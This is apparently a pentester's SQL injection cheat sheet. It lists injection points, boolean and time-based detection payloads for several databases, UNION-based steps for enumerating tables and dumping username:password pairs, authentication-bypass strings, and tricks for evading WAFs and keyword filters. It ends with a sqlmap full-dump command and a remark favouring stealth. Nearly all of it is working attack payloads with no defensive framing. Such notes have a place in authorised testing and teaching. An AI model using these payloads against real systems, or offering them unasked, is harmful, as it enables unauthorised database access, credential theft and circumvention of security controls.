## SQL Injection
Where: search/filter/sort/id/order-by params, array params `filter[]`, headers (User-Agent/Referer/Cookie), path segments, GraphQL args, second-order (stored then used).
Detect: single quote `'` -> 500/SQL error; `1 AND 1=1` vs `1 AND 1=2` boolean diff; time: `1 AND SLEEP(5)` (MySQL), `1; WAITFOR DELAY '0:0:5'` (MSSQL), `pg_sleep(5)` (Postgres).
UNION: find column count with `ORDER BY n` until error, or `UNION SELECT 1,2,3...`; then `UNION SELECT version(),database(),current_user()`; dump `group_concat(table_name)` from `information_schema.tables WHERE table_schema=database()`, then columns, then `group_concat(user,0x3a,password) FROM users`.
Auth bypass: `' OR 1=1-- -`, `admin'-- -`, `' OR '1'='1`.
WAF/keyword-filter evasion: inline comments `UNION/**/SELECT` (comment == token separator, beats `union\s+select` filters), case `UnIoN`, double-URL-encode `%2553ELECT`, no-space `UNION(SELECT(1))`, math `3*2*1=6` instead of `1=1`, `%0a`/`%09` for spaces.
Tools: `sqlmap -u URL --batch --dump --level 5 --risk 3 --tamper=space2comment`. Prefer a targeted manual PoC over spraying (stealth).
